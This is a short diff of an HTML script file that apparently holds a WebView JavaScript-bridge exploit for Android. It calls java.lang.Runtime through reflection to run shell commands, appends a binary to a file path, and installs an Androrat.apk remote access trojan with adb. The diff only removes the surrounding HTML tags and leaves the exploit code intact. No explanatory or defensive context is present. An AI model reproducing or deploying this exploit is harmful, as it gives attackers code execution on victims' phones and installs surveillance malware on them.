@@ -1,4 +1,4 @@
-<html><head><script>
+<script>
 function execute(cmdArgs)
 {
 return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
@@ -20,4 +20,3 @@ execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]);
 execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]);
 alert("over !!!");
 </script>
-</head><body></body></html>
